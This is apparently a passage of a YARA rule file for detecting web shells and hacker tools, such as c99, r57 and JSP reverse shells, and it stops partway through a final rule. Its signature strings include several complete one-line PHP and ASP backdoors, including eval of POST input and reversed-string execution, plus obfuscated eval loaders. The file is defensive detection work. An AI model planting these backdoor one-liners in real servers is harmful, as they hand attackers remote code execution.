rule webshell_webshells_new_code {
    meta:
        id = "4gVihQpnLhVwugIeSOjiNO"
        fingerprint = "v1_sha256_5ae053a9afc1f720c56304c434cd89861e1df4060b7d813921e7f85978227020"
        version = "1.0"
        score = 70
        date = "2014/03/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web shells - generated from file code.php"
        category = "INFO"
        hash = "a444014c134ff24c0be5a05c02b81a79"

    strings:
        $s1 = "<a class=\"high2\" href=\"javascript:;;;\" name=\"action=show&dir=$_ipage_fi"
        $s7 = "$file = !empty($_POST[\"dir\"]) ? urldecode(self::convert_to_utf8(rtrim($_PO"
        $s10 = "if (true==@move_uploaded_file($_FILES['userfile']['tmp_name'],self::convert_"
        $s14 = "Processed in <span id=\"runtime\"></span> second(s) {gzip} usage:"
        $s17 = "<a href=\"javascript:;;;\" name=\"{return_link}\" onclick=\"fileperm"
    condition:
        1 of them
}
rule webshell_webshells_new_jspyyy {
    meta:
        id = "3TvtNHRT6Kpk0GYW2nwTK6"
        fingerprint = "v1_sha256_0afe45556aa7b562672cc4b609cf001aaa617b03028322abac6524f666b069e1"
        version = "1.0"
        score = 70
        date = "2014/03/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web shells - generated from file jspyyy.jsp"
        category = "INFO"
        hash = "b291bf3ccc9dac8b5c7e1739b8fa742e"

    strings:
        $s0 = "<%@page import=\"java.io.*\"%><%if(request.getParameter(\"f\")"
    condition:
        all of them
}
rule webshell_webshells_new_xxxx {
    meta:
        id = "1rOi003yXHiOiV4N5FS8q7"
        fingerprint = "v1_sha256_e14cc1eaf357389ca58193c77ce2f54774aebb42be9df15f12415df356c7ed42"
        version = "1.0"
        score = 70
        date = "2014/03/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web shells - generated from file xxxx.php"
        category = "INFO"
        hash = "5bcba70b2137375225d8eedcde2c0ebb"

    strings:
        $s0 = "<?php eval($_POST[1]);?>  " fullword
    condition:
        all of them
}
rule webshell_webshells_new_JJjsp3 {
    meta:
        id = "on231uKZ98k0R4115xz1O"
        fingerprint = "v1_sha256_44889540effa2f71889e7f6d0c5d12486e256d83b9230c4902d56f6a59b7939b"
        version = "1.0"
        score = 70
        date = "2014/03/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web shells - generated from file JJjsp3.jsp"
        category = "INFO"
        hash = "949ffee1e07a1269df7c69b9722d293e"

    strings:
        $s0 = "<%@page import=\"java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*\"%><%!S"
    condition:
        all of them
}
rule webshell_webshells_new_PHP1 {
    meta:
        id = "9IZgvFx1ywPDhI7sSmPwd"
        fingerprint = "v1_sha256_1c5eb355455c7fbd2b74d91f78e1d77f460dfeb4fe0ee65f18aa1453337b67a0"
        version = "1.0"
        score = 70
        date = "2014/03/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web shells - generated from file PHP1.php"
        category = "INFO"
        hash = "14c7281fdaf2ae004ca5fec8753ce3cb"

    strings:
        $s0 = "<[url=mailto:?@array_map($_GET[]?@array_map($_GET['f'],$_GET[/url]);?>" fullword
        $s2 = ":https://forum.90sec.org/forum.php?mod=viewthread&tid=7316" fullword
        $s3 = "@preg_replace(\"/f/e\",$_GET['u'],\"fengjiao\"); " fullword
    condition:
        1 of them
}
rule webshell_webshells_new_JJJsp2 {
    meta:
        id = "57uGUzw1wDO4P2zJKcSBqc"
        fingerprint = "v1_sha256_47dca67c7a01035996d032cb3871da5532aea81ab6570c93c4a6b148fd95e9f9"
        version = "1.0"
        score = 70
        date = "2014/03/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web shells - generated from file JJJsp2.jsp"
        category = "INFO"
        hash = "5a9fec45236768069c99f0bfd566d754"

    strings:
        $s2 = "QQ(cs, z1, z2, sb,z2.indexOf(\"-to:\")!=-1?z2.substring(z2.indexOf(\"-to:\")+4,z"
        $s8 = "sb.append(l[i].getName() + \"/\\t\" + sT + \"\\t\" + l[i].length()+ \"\\t\" + sQ"
        $s10 = "ResultSet r = s.indexOf(\"jdbc:oracle\")!=-1?c.getMetaData()"
        $s11 = "return DriverManager.getConnection(x[1].trim()+\":\"+x[4],x[2].equalsIgnoreCase("
    condition:
        1 of them
}
rule webshell_webshells_new_radhat {
    meta:
        id = "2vRvsYAkpQBGdf3anArAT5"
        fingerprint = "v1_sha256_28d4d380b25da05a3be439bad72725fa49c947535dfeb5c24994a849c0592b81"
        version = "1.0"
        score = 70
        date = "2014/03/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web shells - generated from file radhat.asp"
        category = "INFO"
        hash = "72cb5ef226834ed791144abaa0acdfd4"

    strings:
        $s1 = "sod=Array(\"D\",\"7\",\"S"
    condition:
        all of them
}
rule webshell_webshells_new_asp1 {
    meta:
        id = "1XLPiueulAL3yWCDXHZELG"
        fingerprint = "v1_sha256_6c76c5388825e29d333096d4cfa3782b7776f31b206a0ed5a8809428d698778b"
        version = "1.0"
        score = 70
        date = "2014/03/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web shells - generated from file asp1.asp"
        category = "INFO"
        hash = "b63e708cd58ae1ec85cf784060b69cad"

    strings:
        $s0 = " http://www.baidu.com/fuck.asp?a=)0(tseuqer%20lave " fullword
        $s2 = " <% a=request(chr(97)) ExecuteGlobal(StrReverse(a)) %>" fullword
    condition:
        1 of them
}
rule webshell_webshells_new_php6 {
    meta:
        id = "49Hc49nFX17MByR9MxcJMl"
        fingerprint = "v1_sha256_495dc6c6769b8605ea946c012ad0ebb54685e7e91afd383027640753d90c6b3f"
        version = "1.0"
        score = 70
        date = "2014/03/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web shells - generated from file php6.php"
        category = "INFO"
        hash = "ea75280224a735f1e445d244acdfeb7b"

    strings:
        $s1 = "array_map(\"asx73ert\",(ar"
        $s3 = "preg_replace(\"/[errorpage]/e\",$page,\"saft\");" fullword
        $s4 = "shell.php?qid=zxexp  " fullword
    condition:
        1 of them
}
rule webshell_webshells_new_xxx {
    meta:
        id = "3HDNz8WB1U763Pry5wj8Eg"
        fingerprint = "v1_sha256_837ed266af8a65ac683be39c32509df34bc8041b336a71c12700ca73bf210b4d"
        version = "1.0"
        score = 70
        date = "2014/03/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web shells - generated from file xxx.php"
        category = "INFO"
        hash = "0e71428fe68b39b70adb6aeedf260ca0"

    strings:
        $s3 = "<?php array_map(\"ass\\x65rt\",(array)$_REQUEST['expdoor']);?>" fullword
    condition:
        all of them
}
rule webshell_GetPostpHp {
    meta:
        id = "4pyVIEtDPhcdNTz8KvzJv9"
        fingerprint = "v1_sha256_e75f66200593c3fdaadf1881235847f6c3f3caadcb7ffe13e8b01bce5f922702"
        version = "1.0"
        score = 70
        date = "2014/03/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web shells - generated from file GetPostpHp.php"
        category = "INFO"
        hash = "20ede5b8182d952728d594e6f2bb5c76"

    strings:
        $s0 = "<?php eval(str_rot13('riny($_CBFG[cntr]);'));?>" fullword
    condition:
        all of them
}
rule webshell_webshells_new_php5 {
    meta:
        id = "5qISSf8EmcuGYjFgpxYQ7T"
        fingerprint = "v1_sha256_280be378bc6cf52ef9454083180015ed00f9d0bc936620a4105c34c3a3002383"
        version = "1.0"
        score = 70
        date = "2014/03/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web shells - generated from file php5.php"
        category = "INFO"
        hash = "cf2ab009cbd2576a806bfefb74906fdf"

    strings:
        $s0 = "<?$_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_u"
    condition:
        all of them
}
rule webshell_webshells_new_PHP {
    meta:
        id = "4sfIzfAIOwVsCqp3gWVhtD"
        fingerprint = "v1_sha256_706f835f63e153f907ae8a5a48f1dc4b9d3b8511b21b7155bc045b0ebdc893fc"
        version = "1.0"
        score = 70
        date = "2014/03/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web shells - generated from file PHP.php"
        category = "INFO"
        hash = "a524e7ae8d71e37d2fd3e5fbdab405ea"

    strings:
        $s1 = "echo \"<font color=blue>Error!</font>\";" fullword
        $s2 = "<input type=\"text\" size=61 name=\"f\" value='<?php echo $_SERVER[\"SCRIPT_FILE"
        $s5 = " - ExpDoor.com</title>" fullword
        $s10 = "$f=fopen($_POST[\"f\"],\"w\");" fullword
        $s12 = "<textarea name=\"c\" cols=60 rows=15></textarea><br>" fullword
    condition:
        1 of them
}
rule webshell_webshells_new_Asp {
    meta:
        id = "32marX68A9Fa89EjUhDd8C"
        fingerprint = "v1_sha256_dd2e9f753e8fa781c28c2d5bb9336bb3f39ed8a496bd89eb54bc1812ef512ab5"
        version = "1.0"
        score = 70
        date = "2014/03/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web shells - generated from file Asp.asp"
        category = "INFO"
        hash = "32c87744ea404d0ea0debd55915010b7"

    strings:
        $s1 = "Execute MorfiCoder(\")/*/z/*/(tseuqer lave\")" fullword
        $s2 = "Function MorfiCoder(Code)" fullword
        $s3 = "MorfiCoder=Replace(Replace(StrReverse(Code),\"/*/\",\"\"\"\"),\"\\*\\\",vbCrlf)" fullword
    condition:
        1 of them
}

/* Update from hackers tool pack */

rule perlbot_pl {
    meta:
        id = "6ayGjpeTkFx0KZUplkyk5H"
        fingerprint = "v1_sha256_784980d620e71fb0cf5aed9ef8bd171a8f50d850bc782645575070b75c42e426"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file perlbot.pl.txt"
        category = "INFO"
        hash = "7e4deb9884ffffa5d82c22f8dc533a45"

    strings:
        $s0 = "my @adms=(\"Kelserific\",\"Puna\",\"nod32\")"
        $s1 = "#Acesso a Shel - 1 ON 0 OFF"
    condition:
        1 of them
}
rule php_backdoor_php {
    meta:
        id = "6JSX1Hrj75zGYuhCbK70MX"
        fingerprint = "v1_sha256_acab82b40760b45d49da51953f78c69166955de54918634c9bfe394208cdbb56"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file php-backdoor.php.txt"
        category = "INFO"
        hash = "2b5cb105c4ea9b5ebc64705b4bd86bf7"

    strings:
        $s0 = "http://michaeldaw.org   2006"
        $s1 = "or http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=c:/windows on win"
        $s3 = "coded by z0mbie"
    condition:
        1 of them
}
rule Liz0ziM_Private_Safe_Mode_Command_Execuriton_Bypass_Exploit_php {
    meta:
        id = "3wlHYy5EKCRVvA6XLnGi4t"
        fingerprint = "v1_sha256_a0606dad4474579354709fe6306d15427afc4dec8ad6760a0ee9e91c86c23e4d"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file Liz0ziM Private Safe Mode Command Execuriton Bypass Exploit.php.txt"
        category = "INFO"
        hash = "c6eeacbe779518ea78b8f7ed5f63fc11"

    strings:
        $s0 = "<option value=\"cat /var/cpanel/accounting.log\">/var/cpanel/accounting.log</opt"
        $s1 = "Liz0ziM Private Safe Mode Command Execuriton Bypass"
        $s2 = "echo \"<b><font color=red>Kimim Ben :=)</font></b>:$uid<br>\";" fullword
    condition:
        1 of them
}
rule Nshell__1__php_php {
    meta:
        id = "tOqNdGc4BkMMfys6RanSL"
        fingerprint = "v1_sha256_53c7cd24c4eddbded1b4c16fd2758bdf66c0bbe396e487a56d56fc053cf3cc1a"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file Nshell (1).php.php.txt"
        category = "INFO"
        hash = "973fc89694097a41e684b43a21b1b099"

    strings:
        $s0 = "echo \"Command : <INPUT TYPE=text NAME=cmd value=\".@stripslashes(htmlentities($"
        $s1 = "if(!$whoami)$whoami=exec(\"whoami\"); echo \"whoami :\".$whoami.\"<br>\";" fullword
    condition:
        1 of them
}
rule shankar_php_php {
    meta:
        id = "798yW2u6o9zsHQDAdiTre2"
        fingerprint = "v1_sha256_58b365206c18b8394cf1e03b71b8e47be10bc933bc2c05b7b03b7dad94f6d6b8"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file shankar.php.php.txt"
        category = "INFO"
        hash = "6eb9db6a3974e511b7951b8f7e7136bb"

    strings:
        $sAuthor = "ShAnKaR"
        $s0 = "<input type=checkbox name='dd' \".(isset($_POST['dd'])?'checked':'').\">DB<input"
        $s3 = "Show<input type=text size=5 value=\".((isset($_POST['br_st']) && isset($_POST['b"
    condition:
        1 of ($s*) and $sAuthor
}
rule Casus15_php_php {
    meta:
        id = "3AJghKap3ilaoIwm9jwkiF"
        fingerprint = "v1_sha256_6ee7a07163d33ca329d3be2084406629711db14db4605e8413ee963eb0f9d5a7"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file Casus15.php.php.txt"
        category = "INFO"
        hash = "5e2ede2d1c4fa1fcc3cbfe0c005d7b13"

    strings:
        $s0 = "copy ( $dosya_gonder2, \"$dir/$dosya_gonder2_name\") ? print(\"$dosya_gonder2_na"
        $s2 = "echo \"<center><font size='$sayi' color='#FFFFFF'>HACKLERIN<font color='#008000'"
        $s3 = "value='Calistirmak istediginiz "
    condition:
        1 of them
}
rule small_php_php {
    meta:
        id = "6FFNGGv2JJK129oMayDi1T"
        fingerprint = "v1_sha256_e0444aa604e8956d423037b70b9476f5653503055d0f1bc875d43de144ce5c44"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file small.php.php.txt"
        category = "INFO"
        hash = "fcee6226d09d150bfa5f103bee61fbde"

    strings:
        $s1 = "$pass='abcdef1234567890abcdef1234567890';" fullword
        $s2 = "eval(gzinflate(base64_decode('FJzHkqPatkU/550IGnjXxHvv6bzAe0iE5+svFVGtKqXMZq05x1"
        $s4 = "@ini_set('error_log',NULL);" fullword
    condition:
        2 of them
}
rule shellbot_pl {
    meta:
        id = "2MZ5bR1wAgYeDDsBck7st5"
        fingerprint = "v1_sha256_5db224e4fe8608bb53f044ca6c0361dc66cadd58c6d4ea5ab4f8ae14ebde0e6e"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file shellbot.pl.txt"
        category = "INFO"
        hash = "b2a883bc3c03a35cfd020dd2ace4bab8"

    strings:
        $s0 = "ShellBOT"
        $s1 = "PacktsGr0up"
        $s2 = "CoRpOrAtIoN"
        $s3 = "# Servidor de irc que vai ser usado "
        $s4 = "/^ctcpflood\\s+(\\d+)\\s+(\\S+)"
    condition:
        2 of them
}
rule fuckphpshell_php {
    meta:
        id = "4rSogcm3misQpg5vCRHUZm"
        fingerprint = "v1_sha256_0c993960b4ca880b818c7b7ba726479ed1c64c46ef8ca82d3c990d69ebe43f42"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file fuckphpshell.php.txt"
        category = "INFO"
        hash = "554e50c1265bb0934fcc8247ec3b9052"

    strings:
        $s0 = "$succ = \"Warning! "
        $s1 = "Don`t be stupid .. this is a priv3 server, so take extra care!"
        $s2 = "\\*=-- MEMBERS AREA --=*/"
        $s3 = "preg_match('/(\\n[^\\n]*){' . $cache_lines . '}$/', $_SESSION['o"
    condition:
        2 of them
}
rule ngh_php_php {
    meta:
        id = "6lxil5e0Hve7MCczQ9QfRv"
        fingerprint = "v1_sha256_c794b216bafdaecf5bd138cc8c7552efbb8c3c571a441489d02a19793a4c294f"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file ngh.php.php.txt"
        category = "INFO"
        hash = "c372b725419cdfd3f8a6371cfeebc2fd"

    strings:
        $s0 = "Cr4sh_aka_RKL"
        $s1 = "NGH edition"
        $s2 = "/* connectback-backdoor on perl"
        $s3 = "<form action=<?=$script?>?act=bindshell method=POST>"
        $s4 = "$logo = \"R0lGODlhMAAwAOYAAAAAAP////r"
    condition:
        1 of them
}
rule jsp_reverse_jsp {
    meta:
        id = "5llOPzBCektSJc9fjgUT82"
        fingerprint = "v1_sha256_bdd2db4c032b25faaaf3a3a8e769000013f643ecfcb8b0374165a244ad2162a6"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file jsp-reverse.jsp.txt"
        category = "INFO"
        hash = "8b0e6779f25a17f0ffb3df14122ba594"

    strings:
        $s0 = "// backdoor.jsp"
        $s1 = "JSP Backdoor Reverse Shell"
        $s2 = "http://michaeldaw.org"
    condition:
        2 of them
}
rule Tool_asp {
    meta:
        id = "19npKrcrckGqbsw0ULexiM"
        fingerprint = "v1_sha256_d6bd782302b2c614fc572babb3825c0e1fcd0de5841ca8541ca27580ccc274d4"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file Tool.asp.txt"
        category = "INFO"
        hash = "8febea6ca6051ae5e2ad4c78f4b9c1f2"

    strings:
        $s0 = "mailto:rhfactor@antisocial.com"
        $s2 = "?raiz=root"
        $s3 = "DIGO CORROMPIDO<BR>CORRUPT CODE"
        $s4 = "key = \"5DCADAC1902E59F7273E1902E5AD8414B1902E5ABF3E661902E5B554FC41902E53205CA0"
    condition:
        2 of them
}
rule NT_Addy_asp {
    meta:
        id = "3tZaCKxy24dn9XiM5Ib2di"
        fingerprint = "v1_sha256_0fc61d5e276786b8be822712cdcfc81146998e535532e44d3da92e0668713a48"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file NT Addy.asp.txt"
        category = "INFO"
        hash = "2e0d1bae844c9a8e6e351297d77a1fec"

    strings:
        $s0 = "NTDaddy v1.9 by obzerve of fux0r inc"
        $s2 = "<ERROR: THIS IS NOT A TEXT FILE>"
        $s4 = "RAW D.O.S. COMMAND INTERFACE"
    condition:
        1 of them
}
rule SimAttacker___Vrsion_1_0_0___priv8_4_My_friend_php {
    meta:
        id = "2d2SUY2RDdY8XYYXgb16F1"
        fingerprint = "v1_sha256_46bc4063d06b4af3e4e61e1e998d489e974e76f17363c9777b8afc39ff21f698"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file SimAttacker - Vrsion 1.0.0 - priv8 4 My friend.php.txt"
        category = "INFO"
        hash = "089ff24d978aeff2b4b2869f0c7d38a3"

    strings:
        $s0 = "SimAttacker - Vrsion : 1.0.0 - priv8 4 My friend"
        $s3 = " fputs ($fp ,\"\\n*********************************************\\nWelcome T0 Sim"
        $s4 = "echo \"<a target='_blank' href='?id=fm&fedit=$dir$file'><span style='text-decora"
    condition:
        1 of them
}
rule RemExp_asp {
    meta:
        id = "7D0sl8LnORJlC3ZIIREQCz"
        fingerprint = "v1_sha256_c7da9908a0252e95b47dbc8fbb36aeac1661dc464123aaca036bd51047a31584"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file RemExp.asp.txt"
        category = "INFO"
        hash = "aa1d8491f4e2894dbdb91eec1abc2244"

    strings:
        $s0 = "<title>Remote Explorer</title>"
        $s3 = " FSO.CopyFile Request.QueryString(\"FolderPath\") & Request.QueryString(\"CopyFi"
        $s4 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=File.Name%>\"> <a href= \"showcode.asp?f"
    condition:
        2 of them
}
rule phvayvv_php_php {
    meta:
        id = "4Sf7mtzEL0GrQaunlDbatZ"
        fingerprint = "v1_sha256_503a69a7e2c30cc82eba430082627bb93c459a95f675b968126bf4524c598863"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file phvayvv.php.php.txt"
        category = "INFO"
        hash = "35fb37f3c806718545d97c6559abd262"

    strings:
        $s0 = "{mkdir(\"$dizin/$duzenx2\",777)"
        $s1 = "$baglan=fopen($duzkaydet,'w');"
        $s2 = "PHVayv 1.0"
    condition:
        1 of them
}
rule klasvayv_asp {
    meta:
        id = "had81xQEFcayeMSYmhYZB"
        fingerprint = "v1_sha256_eb1b11e02b075a4e7d28b77cf91ad596a85e4c697a36304ee177d46735965e75"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file klasvayv.asp.txt"
        category = "INFO"
        hash = "2b3e64bf8462fc3d008a3d1012da64ef"

    strings:
        $s1 = "set aktifklas=request.querystring(\"aktifklas\")"
        $s2 = "action=\"klasvayv.asp?klasorac=1&aktifklas=<%=aktifklas%>&klas=<%=aktifklas%>"
        $s3 = "<font color=\"#858585\">www.aventgrup.net"
        $s4 = "style=\"BACKGROUND-COLOR: #95B4CC; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT"
    condition:
        1 of them
}
rule r57shell_php_php {
    meta:
        id = "mj5tHhlJxPp9jI3TQCtqu"
        fingerprint = "v1_sha256_c7685d09d695284a8172f513c5b22820ade60ed04144878088d51b308192bac9"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file r57shell.php.php.txt"
        category = "INFO"
        hash = "d28445de424594a5f14d0fe2a7c4e94f"

    strings:
        $s1 = " else if ($HTTP_POST_VARS['with'] == \"lynx\") { $HTTP_POST_VARS['cmd']= \"lynx "
        $s2 = "RusH security team"
        $s3 = "'ru_text12' => 'back-connect"
    condition:
        1 of them
}
rule rst_sql_php_php {
    meta:
        id = "6rdA32QTm55qVpkgErFpAN"
        fingerprint = "v1_sha256_d15cf69d9ad8683d2ac1ff09b08b0b26ecaf35df8e45bbd5c3a02c393f88cb34"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file rst_sql.php.php.txt"
        category = "INFO"
        hash = "0961641a4ab2b8cb4d2beca593a92010"

    strings:
        $s0 = "C:\\tmp\\dump_"
        $s1 = "RST MySQL"
        $s2 = "http://rst.void.ru"
        $s3 = "$st_form_bg='R0lGODlhCQAJAIAAAOfo6u7w8yH5BAAAAAAALAAAAAAJAAkAAAIPjAOnuJfNHJh0qtfw0lcVADs=';"
    condition:
        2 of them
}
rule wh_bindshell_py {
    meta:
        id = "4owNDKaqaR1STXxmC7UNoS"
        fingerprint = "v1_sha256_e38a4f5c23371705f9bbf2db8e65d68074554edc1022576166e76d40e06bc039"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file wh_bindshell.py.txt"
        category = "INFO"
        hash = "fab20902862736e24aaae275af5e049c"

    strings:
        $s0 = "#Use: python wh_bindshell.py [port] [password]"
        $s2 = "python -c\"import md5;x=md5.new('you_password');print x.hexdigest()\"" fullword
        $s3 = "#bugz: ctrl+c etc =script stoped=" fullword
    condition:
        1 of them
}
rule lurm_safemod_on_cgi {
    meta:
        id = "5cuivf06iIoEuBbB0FIY0H"
        fingerprint = "v1_sha256_d308ad6cda92fa437b9a4c46cd1b97fb0138aa8d0010256bda56a64ced1c7875"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file lurm_safemod_on.cgi.txt"
        category = "INFO"
        hash = "5ea4f901ce1abdf20870c214b3231db3"

    strings:
        $s0 = "Network security team :: CGI Shell" fullword
        $s1 = "#########################<<KONEC>>#####################################" fullword
        $s2 = "##if (!defined$param{pwd}){$param{pwd}='Enter_Password'};##" fullword
    condition:
        1 of them
}
rule c99madshell_v2_0_php_php {
    meta:
        id = "1lpBUPR8g8efZ1FRJO17bB"
        fingerprint = "v1_sha256_07922511d9dfdd32f6b1f47479fca2063b773024a20dcab6f5cf4d56d66c3397"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file c99madshell_v2.0.php.php.txt"
        category = "INFO"
        hash = "d27292895da9afa5b60b9d3014f39294"

    strings:
        $s2 = "eval(gzinflate(base64_decode('HJ3HkqNQEkU/ZzqCBd4t8V4YAQI2E3jvPV8/1Gw6orsVFLyXef"
    condition:
        all of them
}
rule backupsql_php_often_with_c99shell {
    meta:
        id = "4EXCUDKyoKFb9TdVfaQpcm"
        fingerprint = "v1_sha256_7c64e3d4e5815859c51f05cb376f72ea266b31193f3f4588526005e167ebabad"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file backupsql.php.php.txt"
        category = "INFO"
        hash = "ab1a06ab1a1fe94e3f3b7f80eedbc12f"

    strings:
        $s2 = "//$message.= \"--{$mime_boundary}\\n\" .\"Content-Type: {$fileatt_type};\\n\" ."
        $s4 = "$ftpconnect = \"ncftpput -u $ftp_user_name -p $ftp_user_pass -d debsender_ftplog"
    condition:
        all of them
}
rule uploader_php_php {
    meta:
        id = "7ZPzUSlYjLem0I0VwxAKpK"
        fingerprint = "v1_sha256_6e6ffc4cad2a956cb2b6667928bac5996cf95cd36f43ba789144c46726471f07"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
